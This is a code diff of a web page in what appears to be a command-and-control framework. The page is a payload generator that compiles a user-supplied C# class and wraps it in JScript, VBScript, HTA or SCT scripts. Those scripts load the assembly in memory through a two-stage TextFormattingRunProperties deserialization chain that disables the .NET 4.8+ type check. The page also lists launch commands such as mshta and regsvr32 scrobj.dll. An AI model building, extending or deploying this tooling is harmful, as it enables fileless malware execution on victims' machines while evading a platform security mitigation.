@@ -4,20 +4,10 @@
 <div class="tool-panel">
     <div class="tool-header">
         <h3 class="tool-title">Insecure Deserialization</h3>
-        <p class="tool-subtitle">Generate JScript/VBScript payloads that load and execute .NET assemblies in memory.</p>
+        <p class="tool-subtitle">Two-stage TextFormattingRunProperties deserialization — Assembly.Load + CreateInstance during Deserialize.</p>
     </div>
 
     <div class="loader-content">
-        <div class="loader-section">
-            <h4 class="loader-section-title">Overview</h4>
-            <p class="loader-text">
-                Generates scripts that load a .NET assembly from an embedded base64 blob via
-                <code>Assembly.Load(byte[])</code> and execute your entry class constructor —
-                no PowerShell, no managed EXE, just
-                <code>wscript.exe</code>, <code>cscript.exe</code>, or <code>mshta.exe</code>.
-            </p>
-        </div>
-
         <div class="loader-section">
             <h4 class="loader-section-title">1 — Input</h4>
             <div class="loader-tabs">
@@ -31,7 +21,7 @@
                 </button>
                 <button class="loader-tab @(_inputMode == InputMode.Blob ? "loader-tab--active" : "")"
                         @onclick="() => SetInputMode(InputMode.Blob)">
-                    <C2Icon Name="file-text" Size="Size.Xs" /> Serialized Blob
+                    <C2Icon Name="file-text" Size="Size.Xs" /> Blob
                 </button>
             </div>
 
@@ -39,8 +29,8 @@
             {
                 <div class="loader-tab-body">
                     <p class="loader-text loader-hint">
-                        Write your entry class in C#. Compiled in-browser using Roslyn targeting .NET Framework
-                        @(_runtime == Runtime.Net4 ? "4.0" : "2.0"). Your payload runs in the constructor.
+                        Write your entry class. Payload runs in the <b>constructor</b>.
+                        Compiled in-browser via Roslyn targeting .NET Framework 4.0.
                     </p>
                     <textarea class="loader-textarea" @bind="_sourceCode" @bind:event="oninput"
                               rows="18" style="font-family:var(--font-mono);font-size:12px;tab-size:4;"></textarea>
@@ -61,11 +51,6 @@
                     @if (_compileSuccess)
                     {
                         <p class="loader-text loader-hint" style="color:#27ae60;">Compiled successfully — @FormatSize(_dllBytes?.Length ?? 0)</p>
-                        <div class="loader-actions">
-                            <button class="loader-link-btn" @onclick="DownloadDllZip">
-                                <C2Icon Name="download" Size="Size.Xs" /> Download DLL (.zip)
-                            </button>
-                        </div>
                     }
                 </div>
             }
@@ -73,8 +58,8 @@
             {
                 <div class="loader-tab-body">
                     <p class="loader-text loader-hint">
-                        Upload a .NET assembly DLL. The script will load it via <code>Assembly.Load(byte[])</code>
-                        and call <code>CreateInstance</code> on your entry class.
+                        Upload a .NET assembly DLL. The entry class constructor will be triggered
+                        via <code>Activator.CreateInstance</code> during deserialization.
                     </p>
                     <div class="loader-actions">
                         <label class="loader-link-btn" style="cursor:pointer">
@@ -87,16 +72,15 @@
                         }
                     </div>
                     <C2Input Value="@_typeName" ValueChanged="v => { _typeName = v; Rebuild(); }" BindOnInput
-                             Placeholder="Entry class (e.g. TestClass or MyNamespace.TestClass)"
-                             CssClass="loader-input-spacing" />
+                             Placeholder="Entry class (e.g. TestClass)" CssClass="loader-input-spacing" />
                 </div>
             }
             else
             {
                 <div class="loader-tab-body">
                     <p class="loader-text loader-hint">
-                        Paste a pre-serialized BinaryFormatter blob (base64). Use this with payloads
-                        from ysoserial.net or the original DotNetToJScript tool.
+                        Paste a standalone pre-built BinaryFormatter blob (base64) from
+                        <b>ysoserial.net</b> or <b>GadgetToJScript</b>. Single-stage, no type check bypass.
                     </p>
                     <textarea class="loader-textarea" @bind="_rawBlob" @bind:event="oninput" @bind:after="RebuildFromBlob"
                               placeholder="AAEAAAD/////..." rows="4"></textarea>
@@ -105,38 +89,15 @@
         </div>
 
         <div class="loader-section">
-            <h4 class="loader-section-title">2 — Runtime</h4>
+            <h4 class="loader-section-title">2 — Output</h4>
             <div class="loader-tabs">
-                <button class="loader-tab @(_runtime == Runtime.Net4 ? "loader-tab--active" : "")"
-                        @onclick="() => { _runtime = Runtime.Net4; RebuildCurrent(); }">
-                    .NET 4.0
-                </button>
-                <button class="loader-tab @(_runtime == Runtime.Net2 ? "loader-tab--active" : "")"
-                        @onclick="() => { _runtime = Runtime.Net2; RebuildCurrent(); }">
-                    .NET 2.0
-                </button>
-            </div>
-        </div>
-
-        <div class="loader-section">
-            <h4 class="loader-section-title">3 — Output</h4>
-            <div class="loader-tabs">
-                <button class="loader-tab @(_format == D2JSFormat.JScript ? "loader-tab--active" : "")"
-                        @onclick="() => { _format = D2JSFormat.JScript; RebuildCurrent(); }">
-                    JScript
-                </button>
-                <button class="loader-tab @(_format == D2JSFormat.VBScript ? "loader-tab--active" : "")"
-                        @onclick="() => { _format = D2JSFormat.VBScript; RebuildCurrent(); }">
-                    VBScript
-                </button>
-                <button class="loader-tab @(_format == D2JSFormat.Hta ? "loader-tab--active" : "")"
-                        @onclick="() => { _format = D2JSFormat.Hta; RebuildCurrent(); }">
-                    HTA
-                </button>
-                <button class="loader-tab @(_format == D2JSFormat.Sct ? "loader-tab--active" : "")"
-                        @onclick="() => { _format = D2JSFormat.Sct; RebuildCurrent(); }">
-                    SCT
-                </button>
+                @foreach (var fmt in Enum.GetValues<ScriptFormat>())
+                {
+                    <button class="loader-tab @(_format == fmt ? "loader-tab--active" : "")"
+                            @onclick="() => { _format = fmt; RebuildCurrent(); }">
+                        @fmt
+                    </button>
+                }
             </div>
 
             @if (!string.IsNullOrEmpty(_output))
@@ -162,11 +123,12 @@
         <div class="loader-section">
             <h4 class="loader-section-title">How It Works</h4>
             <p class="loader-text">
-                1. Script sets target CLR version via <code>COMPLUS_Version</code> environment variable<br/>
-                2. DLL bytes are decoded from the embedded base64 blob<br/>
-                3. <code>Assembly.Load(byte[])</code> loads the DLL into the process via COM reflection<br/>
-                4. <code>CreateInstance</code> instantiates your entry class — the constructor runs your payload<br/>
-                5. Runs under <code>wscript.exe</code> / <code>cscript.exe</code> / <code>mshta.exe</code> — no PowerShell needed
+                1. Script sets CLR version via <code>COMPLUS_Version</code><br/>
+                2. <b>Stage 1</b>: <code>BinaryFormatter.Deserialize</code> processes <code>TextFormattingRunProperties</code>
+                   → XAML disables the .NET 4.8+ type check (throws after)<br/>
+                3. <b>Stage 2</b>: In the catch block, another <code>TextFormattingRunProperties</code> with XAML:
+                   <code>Convert.FromBase64String</code> → <code>Assembly.Load</code> → <code>CreateInstance</code><br/>
+                4. Your class constructor runs — zero method calls from JScript/VBScript
             </p>
         </div>
 
@@ -175,8 +137,8 @@
             <p class="loader-text">
                 <b>JScript</b> — <code>wscript.exe payload.js</code> or <code>cscript.exe payload.js</code><br/>
                 <b>VBScript</b> — <code>wscript.exe payload.vbs</code> or <code>cscript.exe payload.vbs</code><br/>
-                <b>HTA</b> — <code>mshta.exe payload.hta</code> (runs in a GUI context)<br/>
-                <b>SCT</b> — <code>regsvr32 /s /n /u /i:payload.sct scrobj.dll</code> (no file drop needed if hosted)
+                <b>HTA</b> — <code>mshta.exe payload.hta</code> (GUI context, auto-closes)<br/>
+                <b>SCT</b> — <code>regsvr32 /s /n /u /i:payload.sct scrobj.dll</code>
             </p>
         </div>
     </div>
@@ -184,11 +146,9 @@
 
 @code {
     private enum InputMode { Source, Upload, Blob }
-    private enum Runtime { Net2, Net4 }
 
     private InputMode _inputMode = InputMode.Source;
-    private Runtime _runtime = Runtime.Net4;
-    private D2JSFormat _format = D2JSFormat.JScript;
+    private ScriptFormat _format = ScriptFormat.Hta;
 
     // Upload mode
     private string _dllFileName = "";
@@ -209,7 +169,7 @@
     // Output
     private string _output = "";
 
-    private string RuntimeVersion => _runtime == Runtime.Net4 ? "v4.0.30319" : "v2.0.50727";
+    private const string RuntimeVersion = "v4.0.30319";
 
     private const string DefaultTemplate = @"using System;
 using System.Runtime.InteropServices;
@@ -247,7 +207,6 @@ public class TestClass
     {
         if (_inputMode == InputMode.Blob) RebuildFromBlob();
         else if (_inputMode == InputMode.Upload) Rebuild();
-        // Source mode rebuilds on Compile click only
     }
 
     private async Task CompileSource()
@@ -258,10 +217,7 @@ public class TestClass
         _output = "";
         StateHasChanged();
 
-        var result = await Compiler.CompileAsync(
-            _sourceCode,
-            _sourceAssemblyName,
-            _runtime == Runtime.Net4);
+        var result = await Compiler.CompileAsync(_sourceCode, _sourceAssemblyName, true);
 
         if (result.Success)
         {
@@ -271,7 +227,7 @@ public class TestClass
             _compileSuccess = true;
 
             var dllB64 = Convert.ToBase64String(_dllBytes!);
-            _output = D2JSGenerator.Generate(dllB64, _typeName, _format, RuntimeVersion);
+            _output = InsecureDeserializationGenerator.Generate(dllB64, _typeName, _format, RuntimeVersion);
         }
         else
         {
@@ -309,7 +265,7 @@ public class TestClass
         }
 
         var dllB64 = Convert.ToBase64String(_dllBytes);
-        _output = D2JSGenerator.Generate(dllB64, _typeName, _format, RuntimeVersion);
+        _output = InsecureDeserializationGenerator.Generate(dllB64, _typeName, _format, RuntimeVersion);
     }
 
     private void RebuildFromBlob()
@@ -319,7 +275,7 @@ public class TestClass
             _output = "";
             return;
         }
-        _output = D2JSGenerator.GenerateFromBlob(_rawBlob.Trim(), _format, RuntimeVersion);
+        _output = InsecureDeserializationGenerator.GenerateFromBlob(_rawBlob.Trim(), _format, RuntimeVersion);
     }
 
     private async Task Download()
@@ -339,39 +295,12 @@ public class TestClass
         ");
     }
 
-    private async Task DownloadDllZip()
+    private static string FormatExtension(ScriptFormat fmt) => fmt switch
     {
-        if (_dllBytes is not { Length: > 0 }) return;
-
-        var name = !string.IsNullOrEmpty(_sourceAssemblyName) ? _sourceAssemblyName : "payload";
-
-        using var ms = new MemoryStream();
-        using (var zip = new System.IO.Compression.ZipArchive(ms, System.IO.Compression.ZipArchiveMode.Create, true))
-        {
-            var entry = zip.CreateEntry($"{name}.dll");
-            using var es = entry.Open();
-            es.Write(_dllBytes, 0, _dllBytes.Length);
-        }
-
-        var base64 = Convert.ToBase64String(ms.ToArray());
-        await JS.InvokeVoidAsync("eval", $@"
-            (function() {{
-                var a = document.createElement('a');
-                a.href = 'data:application/zip;base64,{base64}';
-                a.download = '{name}.zip';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-            }})()
-        ");
-    }
-
-    private static string FormatExtension(D2JSFormat fmt) => fmt switch
-    {
-        D2JSFormat.JScript => ".js",
-        D2JSFormat.VBScript => ".vbs",
-        D2JSFormat.Hta => ".hta",
-        D2JSFormat.Sct => ".sct",
+        ScriptFormat.JScript => ".js",
+        ScriptFormat.VBScript => ".vbs",
+        ScriptFormat.Hta => ".hta",
+        ScriptFormat.Sct => ".sct",
         _ => ".txt"
     };
 
